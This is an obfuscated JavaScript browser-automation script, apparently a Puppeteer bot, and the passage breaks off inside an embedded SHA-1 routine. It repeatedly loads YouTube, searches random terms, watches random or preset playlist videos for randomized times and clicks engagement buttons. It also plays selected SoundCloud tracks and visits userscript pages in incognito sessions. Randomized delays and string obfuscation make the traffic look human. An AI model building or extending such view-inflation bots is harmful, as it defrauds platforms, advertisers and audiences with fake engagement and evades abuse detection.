const W = d,
  U = b,
  T = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0xf55 + 0x7 * 0x454 + -0x2da0))) + i;
}

function a() {
  const bl = [
    'WPJdTr3dQLazsWqjW6q',
    'WQxdUCklWOlcSYTwWPW6va',
    'enuserjs.o',
    'FNxdGdebW5GBbZNdKq',
    'zc1HDxrVBwf0zq',
    '__scope',
    'WPnADSo5AdL2DmkcCG',
    'W5W2aCkyW7FdTSkNWOpcMLq',
    'ChrZl2j5lxnPDa',
    'BgvUz3rO',
    'mNbxy2D3',
    'W5hcJLmDWOeuzZK3fW',
    'W5dcJK8aWOedpgqPbq',
    'XLS4qmyCAX',
    'pts/429746',
    'DY55B3v0DwjLlG',
    'W7T2W5XdWPFdJYGjaf8',
    'BMvJCMfMDcbIDq',
    'pts/455853',
    'rg/en/scri',
    'AgvHzgvYCW',
    'h4TBnDkX4y',
    'haos-in-ou',
    'zmk1WONdQW',
    'sfrnta',
    'zwfZEwzVCMSUBW',
    '5e-qDy-uUJ',
    'Safari/537',
    'WPNdMWddUCo9WRzsW53cGmkL',
    'xSkFW7RdT8kztH3cI8oAxG'
  ];
  a = function() {
    return bl;
  };
  return a();
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0xd61 * -0x1 + -0x6b * -0x5b + -0x18a8), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x1 * -0x92f1 + -0x19c * 0x43 + 0xfd * 0x4f + (-0x1b18 + -0x4dc5 + 0xa375) * random()) : await standardWaitForNetIdle(f), await wait(-0x10 * -0xa6 + -0x2 * -0x3db + -0x25 * -0xa + (-0x11c7 + 0x1b18 + 0x1dbf) * random()), 0x557 + 0x205a + 0x8 * -0x4b6;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x12c2 + 0x258d + 0xbd), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x1ced * -0x1 + 0x1 * 0x20fc + -0x40e;
}
async function randomWait() {
  return await wait(-0x7b5 + 0x1816 + 0x327 + (-0x5b * 0x29 + -0x860 + 0x91 * 0x4b) * random()), -0x1229 + 0x1a24 + -0x1 * 0x7fa;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = d;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x133 * -0x2 + -0x167b + 0x1415, 0x1 * 0x275 + 0xdeb + -0x1059), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', R(0x5));
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x16d24 + -0x4b * 0x392 + -0x1 * -0x8902) * getRandomInt(0x16 * 0x1bc + 0x1216 * 0x2 + -0x4a52, -0x110 * -0x14 + -0x1d31 + 0x7f6 * 0x1), h)), -0x1c26 + -0x663 + -0x1145 * -0x2;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1 * 0x2ef + 0x1203 + 0xf14 * -0x1;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x1 * -0x1ee7 + 0x449 + 0x5 * 0x553]['split']('\x20');
    for (let k = -0x1 * 0xfee + 0x172c + -0x73e * 0x1; k < i['length']; k += -0x2608 + 0x148b + -0x3 * -0x5d5)
      j += i[k] * h[i[k + (0x1314 + 0x1a13 + 0x2d26 * -0x1)]];
    return j;
  });
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x216b + -0x257 + 0x23c2);
    let h = e[f];
    if (b['viGRtV'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x6a4 + 0x607 * -0x3 + 0x18b9, s, t, u = 0x2589 + -0xc5 * -0x11 + -0x329e; t = n['charAt'](u++); ~t && (s = r % (-0x4cd * -0x4 + 0x5 * 0x311 + -0x2285) ? s * (0xd61 * -0x1 + -0x6b * -0x5b + -0x1868) + t : t, r++ % (-0xf * -0x1a2 + -0x6b * 0x2b + 0x6f * -0xf)) ? p += String['fromCharCode'](-0x908 + -0x19ed + 0x23f4 & s >> (-(-0x10 * -0xa6 + -0x2 * -0x3db + -0x59 * 0x34) * r & -0x8e3 + 0xd8c + -0x4a3)) : 0x557 + 0x205a + 0x1 * -0x25b1) {
          t = o['indexOf'](t);
        }
        for (let v = -0x12c2 + 0x258d + -0x12cb, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1ced * -0x1 + 0x1 * 0x20fc + -0x3ff))['slice'](-(-0x7b5 + 0x1816 + -0x105f));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x5b * 0x29 + -0x860 + 0x7d * 0x2f,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x1229 + 0x1a24 + -0x1 * 0x7fb; u < -0x133 * -0x2 + -0x167b + 0x1515; u++) {
          p[u] = u;
        }
        for (u = 0x1 * 0x275 + 0xdeb + -0x1060; u < 0x1e6e + -0x1d * 0xc5 + -0x1 * 0x71d; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x16 * 0x1bc + 0x1216 * 0x2 + -0x4954), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x110 * -0x14 + -0x1d31 + 0x7f1 * 0x1, q = -0x1c26 + -0x663 + -0x4ef * -0x7;
        for (let v = -0x1 * 0x2ef + 0x1203 + 0xf14 * -0x1; v < n['length']; v++) {
          u = (u + (0x1 * -0x1ee7 + 0x449 + 0x5 * 0x553)) % (-0x1 * 0xfee + 0x172c + -0x63e * 0x1), q = (q + p[u]) % (-0x2608 + 0x148b + -0x1 * -0x127d), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1314 + 0x1a13 + 0x2c27 * -0x1)]);
        }
        return t;
      };
      b['fFhRjr'] = m, c = arguments, b['viGRtV'] = !![];
    }
    const j = e[-0x1 * 0x1722 + -0x367 + -0x1 * -0x1a89],
      k = f + j,
      l = c[k];
    return !l ? (b['VSwWUu'] === undefined && (b['VSwWUu'] = !![]), h = b['fFhRjr'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1 * 0x1722 + -0x367 + -0xd * -0x20b)['map'](l => Array['from'](l['children']))['flat'](-0x281 * -0xe + -0xb * 0x1e + -0x21c3)['map'](l => l['childNodes'][-0x1 * -0x905 + 0x3 * -0x22 + -0x89e]['childNodes'][-0x1be5 + -0x26ba + 0x767 * 0x9]['childNodes'][0x42f + 0x442 * -0x7 + 0x10 * 0x19a]['childNodes'][-0x20ff * -0x1 + 0x257c * -0x1 + 0x47d]['childNodes'][-0x11 * 0xf7 + 0x1 * -0x18f2 + 0x4f * 0x86]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0xa65 + -0x1490 + -0x1 * -0xe13, 0x1 * -0x1c85 + 0x2461 + 0xc * 0xf9)), await f['click']('#__hookedV' + 'idToWatch'), await wait(-0x3 * -0x14a4 + -0x35f * 0x1 + 0xb * 0x1);
  const h = await getMaxTime(f),
    i = Math['min']((0x16bf7 + 0xfd * 0x1 + -0x8294) * getRandomInt(-0x1f95 + 0x1 * 0x1f1b + 0x7c, 0x20c1 + -0xff8 * 0x1 + -0x10c4), h);
  return await wait(i), -0x1f * 0x2b + -0x2 * 0x11f4 + 0x26 * 0x115;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x1a5 * -0x17 + 0x11c + -0x26ef]['children'][0x1 * 0x2429 + 0x13d1 + 0x1bfd * -0x2]['children'][-0x22 * 0x2f + 0x1f9 * -0x4 + 0xe22]['children'][-0xd09 + -0x6a + 0xd73]['children'][0xe10 + 0x3a * 0x14 + 0x7 * -0x2a8]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x4 * 0xd2 + -0x10c5 + -0x97 * -0x22;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x17de + 0x206b + 0x15d * -0x29 + (-0x6b3 + -0x2f + 0x714) * random()
  }), await wait(0x170a + 0x6 * -0x3ce + -0x2 * -0xdf + (-0x86 * -0x17 + 0x486 * -0x1 + -0x1 * 0x658) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x14b8 + -0x10bb * 0x1 + -0x3fb]['childNodes'][-0x137d + 0x185f + 0x4e1 * -0x1]['childNodes'][0xa62 + -0x18f6 + 0x1 * 0xe95]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0x1f06 + 0x46f + 0x1a9c]['childNodes'][0x1 * 0x14fa + 0x1f11 + -0x340b]['childNodes'][0x2 * -0x1296 + 0x2416 + -0x7 * -0x28]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x226b + -0x1f71 * 0x1 + 0x2f9 * -0x1),
          r = 0x1b63 + 0xc24 + -0x2787;
        for (let u = -0x9fa * -0x1 + 0x22 * 0xd9 + -0x26cc; u < q['length']; u += 0x2 * 0x9f7 + 0x2 * -0x897 + -0x6 * 0x75)
          r += q[u] * k[q[u + (-0x1013 * 0x1 + -0x227d + 0x3291)]];
        return r;
      }(n);
  });
  await wait((-0x380f + 0x8d5 + 0xd7 * 0x7e) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x111da + 0x16ed0 + 0x8d6a) * getRandomInt(0x237d + -0x6b0 + 0x4 * -0x733, 0x1788 + -0x1 * 0x1eeb + 0x76d), h + (-0xd * -0x10a + 0x723 + -0x11d));
  return await wait(i), 0xf2 * 0xb + 0x12e8 + -0x241 * 0xd;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x38 * 0x61 + 0xb82 + -0x20ba), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x1d * 0x62 + -0x57b + 0x619 + (0x36 * -0x65 + 0x1736 + 0x200) * Math['random']());
    });
  }, -0x10 * -0x1d8 + -0x4 * -0xc5b + -0x2 * 0x19ca);
  await wait(-0x79cc * 0x8 + -0x14f * -0x1d3 + 0x5ff23);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x2c25 * 0x4 + -0x92a4 * -0x2 + -0xeb7c) * getRandomInt(-0x5c6 * -0x2 + -0x1890 + -0x8 * -0x1a1, 0x24c4 * 0x1 + 0xb87 * -0x1 + 0x4 * -0x649)), clearInterval(h), -0x67f * 0x2 + -0x12e * -0xa + 0x133 * 0x1;
}
async function runYTModule(f, h) {
  const S = c,
    i = await createPage(f, 'https://ww' + S(0xf) + 'com/');
  for (await randomWait();;) {
    let j = 0x1db9 + -0xa * 0x1b3 + -0xcbb;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x2c * 0xaf + -0x8 * -0x24c + -0x3073 * 0x1;
    await randomWait();
  }
  return -0x1a24 + 0x234c + -0x927;
}

function fetchRandomSC() {
  return Math['random']() <= -0x812 * -0x2 + -0xb45 * 0x1 + -0x4df + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x8dd * 0x1 + -0x205a + 0x2937 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x214c + 0x1 * 0x517 + 0x1c35 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x1 * 0xe7d + 0x1 * -0x3aa + -0x1 * -0x1227;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x125 * 0x8f + 0x83 * 0x155 + -0xa262 + getRandomInt(-0x79f * 0x1 + 0xb9 * 0x6d + -0xc8e, 0x6d34 + 0x9ba5 + -0x93a9));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1abb * -0x1 + 0x1009 * -0x2 + 0x558), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x1 * -0xf26 + -0x1237 + 0x1 * 0x215d;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x122b + -0x895 * 0x1 + 0x8 * 0x358, 0xd32 * 0x1 + -0x493 * -0x3 + -0x1ab9)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x233a + -0x5 * 0x2ca + -0xd78 + floor((-0x3da + -0x54e * -0x1 + 0x274) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x7d55f736 + 0x4 * -0x7c045d6 + 0x21ab2022),
          0x1 * -0xa53a72 + -0x85251 * -0x1a + 0x4cde38,
          0x7814 + -0x1 * -0xed8b + -0xe59f,
          0x2b * -0xd9 + 0x8f5 + 0x2 * 0xdff
        ], y = [
          0x1658 + 0x8b * -0x3 + -0x1 * 0x149f,
          0x3 * -0x836 + -0xb92 * 0x1 + 0x2444,
          0x1 * -0x1c3a + 0x8 * -0x2ba + 0x179 * 0x22,
          -0x26ff * 0x1 + 0xc01 + 0x1afe
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x123f + 0x1bba + -0x97a)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x1748 + 0x1ad4 + -0x38c; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x2406 + -0xc43 * 0x2 + -0x20 * 0x5c) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x2bb + -0x1ff3 + 0x1d38] = A[0x7 * 0x7f + 0x4dc + -0x1d * 0x49] = A[0x1259 * -0x2 + -0x33 * 0x6a + 0x39d1] = A[0x605 * 0x1 + -0x1e83 + 0x1880] = A[-0x2f * 0x46 + -0x12d * 0xe + -0x1 * -0x1d53] = A[0x7 * 0x423 + 0x108f + -0x2d80] = A[0x1 * 0x1472 + -0x1c8d * -0x1 + -0x30fa] = A[0x2 * 0x12a3 + -0x25f3 + 0xb3] = A[-0x3 * 0x327 + -0x1c8c + 0x2608] = A[-0x1ada + 0x10 * -0x16 + 0x1c42] = A[0xd * -0x14b + 0xe12 * -0x2 + 0x2cfc] = A[-0x12e4 + -0x22f1 * -0x1 + -0x1003] = A[0x33 * -0xc1 + -0xce5 + -0x36d * -0xf] = A[-0x256 * -0xd + -0x16a * 0x1 + -0x1ce8] = A[-0xebc + 0x3b * -0x19 + 0xa46 * 0x2] = A[-0xfb0 * -0x1 + -0x166e + 0x1e * 0x3a] = A[0xa32 + -0x2 * -0x74b + 0x18b9 * -0x1] = 0xc55 * 0x1 + 0x23e2 + -0x1 * 0x3037, this['blocks'] = A) : this['blocks'] = [
                -0x204d + -0x2 * -0x134f + -0x651,
                -0x52 + -0x24d8 + 0x252a,
                -0x1fd7 + 0x205 * -0x1 + 0x21dc,
                0x1 * -0x2455 + -0x3c * -0x29 + 0x1ab9,
                -0xfe2 + -0xf1b + -0x1 * -0x1efd,
                0x36e * 0x4 + 0xa6e + -0x1826,
                -0x1 * -0x1d + 0xc * -0xfd + -0x1 * -0xbbf,
                0x50c + 0x1eb0 + -0x23bc,
                -0xb98 * -0x2 + 0xff1 + -0x1b * 0x173,
                -0x12 * -0x33 + -0x9a9 + 0x613,
                0x159f + 0x2 * -0x7cf + -0x601,
                -0x179d + -0x15 * -0x9d + -0x1 * -0xabc,
                0x1890 + 0xc55 + -0x24e5,
                -0x61f * -0x2 + 0x195b * -0x1 + 0x3 * 0x45f,
                -0x340 + -0x112d * 0x1 + -0x6cf * -0x3,
                0x2bb * -0x4 + 0x7c * -0x1 + 0xb68,
                0x11de + -0x1442 + -0x2 * -0x132
              ], this['h0'] = 0x1a0eea9 + -0xcd5a64e9 + 0x7 * 0x2bdb3a77, this['h1'] = 0x130316a09 + 0x3 * -0x7bc8cb4f + 0x132f6a36d, this['h2'] = 0x2f83c4ff * 0x2 + 0xc95d19b2 + -0x8fa9c6b2, this['h3'] = 0x25601 * -0x98f + -0x6d98d62 + -0xb2d * -0x40f63, this['h4'] = 0xee95fe32 * -0x1 + 0x1 * 0xcccae4a4 + 0xe59dfb7e, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x2 * 0xd5 + 0x14de + -0x1688, this['finalized'] = this['hashed'] = 0xd * 0xa9 + -0x1d * 0x37 + 0x25a * -0x1, this['first'] = -0x6 * 0x17 + 0x1 * 0x14ef + -0x1464;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x1c18 + -0x114a + -0x13a * -0x25, O = J['length'] || 0x213 * 0x7 + 0x12b8 + -0x213d, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0xb8a + 0x1ee2 + -0x1358, P[0x1930 + 0x1b * -0x162 + 0xc26] = this['block'], P[0x9 * 0x124 + -0x16e * -0x1 + -0xba2] = P[-0x7ad + 0x2 * -0x33 + 0x814 * 0x1] = P[-0x5a * 0x21 + -0x1 * 0x2317 + 0x957 * 0x5] = P[-0x1 * 0x350 + -0x1423 + 0x6 * 0x3e9] = P[-0x107 * -0x25 + -0x23f9 + -0xe * 0x25] = P[0x558 + 0x1239 * 0x2 + -0x29c5] = P[0xf90 + 0x102a + -0xfda * 0x2] = P[-0x70e + -0x78a + 0xe9f] = P[-0x1e2f * 0x1 + -0x1 * -0xdf8 + 0x103f] = P[-0x40f * -0x8 + 0x144 + 0x1 * -0x21b3] = P[-0x12cb + -0x2 * 0xe1d + 0x2f0f] = P[-0x1f7b * 0x1 + 0x8c * -0x1d + 0x2f62] = P[-0x1461 + 0x1e41 + -0x9d4] = P[-0xdd4 + 0x13 * 0x1cd + -0x1456 * 0x1] = P[-0x1378 + -0x1e95 + 0x321b] = P[0x1 * -0x154d + 0x1597 + -0x3b] = -0xa1 * -0x28 + 0x2 * 0x979 + -0x160d * 0x2), K) {
                    for (N = this['start']; M < O && N < 0x11 * -0x2b + -0x799 * -0x2 + 0x5 * -0x26b; ++M)
                      P[N >> -0x128 * 0x8 + 0x92 * -0x3 + -0x1d4 * -0x6] |= J[M] << y[0x9e * 0x17 + 0x1a * -0x113 + 0x11 * 0xcf & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x2 * -0x1107 + 0x74a + -0x1 * -0x1b04; ++M)
                      (L = J['charCodeAt'](M)) < 0xe71 + 0x348 + -0x1 * 0x1139 ? P[N >> 0xdb9 + 0x1 * 0x26af + -0x3466] |= L << y[0x1d6f + 0x43 * -0x62 + -0x8a * 0x7 & N++] : L < -0xdf3 * 0x1 + 0x1 * -0x1904 + 0x2ef7 * 0x1 ? (P[N >> -0x1022 + 0x725 + 0x8ff] |= (-0x1 * 0x24b3 + 0x10 * 0x1cb + 0x8c3 | L >> 0xe3 * 0x2c + 0xba6 + -0x4 * 0xca9) << y[0x17fe * 0x1 + 0x1de3 + -0x3d9 * 0xe & N++], P[N >> 0x193 * -0x9 + 0x3d9 + 0xa54] |= (-0x2 * 0xbcc + -0x2348 + -0x1db0 * -0x2 | -0xd5 * 0x12 + 0xa * -0xc1 + -0x1 * -0x16c3 & L) << y[0x3a8 + -0x2599 + 0x21f4 & N++]) : L < 0x4074 + 0x627c + 0x8d8 * 0x6 || L >= 0x42e8 + -0x1 * -0x1093d + -0x6c25 ? (P[N >> 0x93b + -0x1 * -0x1fd1 + -0x290a] |= (-0x179c + 0xb5 * 0xd + 0xf4b | L >> 0x2f0 + -0x1b0f + 0x182b) << y[-0x14f0 + -0x1792 + 0x1d * 0x189 & N++], P[N >> -0x1 * 0x1266 + -0x19ad + 0x2c15 * 0x1] |= (-0x2e * 0x4 + 0x2185 + -0x204d | L >> -0x89a * 0x4 + 0x1 * -0x223 + -0x353 * -0xb & 0x2516 + 0x26bb * 0x1 + -0x239 * 0x22) << y[0x12c3 * -0x1 + -0x1e * 0x94 + -0x6 * -0x605 & N++], P[N >> 0xb89 * 0x2 + -0x3 * 0x847 + 0x1c5] |= (0x189e + 0x133c + -0x2b5a | 0xec * 0xe + -0x25f9 * -0x1 + -0x32a2 & L) << y[-0x2d9 * -0x1 + 0xa * -0x185 + -0x1c4 * -0x7 & N++]) : (L = 0x9964 + 0x1 * 0x18347 + -0x11cab + ((-0x6f4 * 0x1 + -0xe54 + 0x1947 & L) << 0xa27 * 0x2 + 0x26cb * -0x1 + -0x62d * -0x3 | -0x131c + -0x1 * -0x1937 + -0x21c & J['charCodeAt'](++M)), P[N >> -0x2f5 * -0xd + 0x4 * 0x394 + -0x34bf] |= (-0x2622 + -0xf35 + 0x5 * 0xadb | L >> 0xbe * -0x2 + 0xa35 + -0x8a7) << y[-0x7 * 0x187 + 0xb77 + -0xc3 & N++], P[N >> 0x17cc + -0x821 * 0x4 + 0x8ba] |= (-0x228e + 0x1 * 0x1877 + -0xa97 * -0x1 | L >> 0x20f1 + 0x335 + -0x241a & -0xcd7 + 0x757 * -0x5 + 0x31c9) << y[-0x1888 + -0x1 * -0x1b59 + -0x2ce & N++], P[N >> 0x23af + 0xb * -0x7b + 0x5 * -0x614] |= (-0xae9 + 0x3d5 + 0x794 | L >> -0x8d * -0x2b + -0x26 * -0xd9 + -0x1 * 0x37df & -0x44 + 0x2638 + -0x25b5) << y[0x1b5d * -0x1 + -0x1 * -0x14d5 + 0x68b & N++], P[N >> 0x8e3 + -0x191 * 0x1 + -0x34 * 0x24] |= (-0xd1 + -0x1fd * -0x4 + -0x1 * 0x6a3 | 0x1 * 0x7f3 + -0x80e * -0x1 + -0xfc2 & L) << y[0x6 * -0x2a8 + 0x1a * 0x114 + 0x3 * -0x407 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0xb7a + -0x1 * -0xe1d + -0x1957 ? (this['block'] = P[-0xa05 + 0x3d9 * 0x5 + -0x125 * 0x8], this['start'] = N - (-0x2 * 0xee3 + 0xae1 + 0x1325), this['hash'](), this['hashed'] = -0x42d + 0x6b * -0x52 + 0x2674) : this['start'] = N;
                }
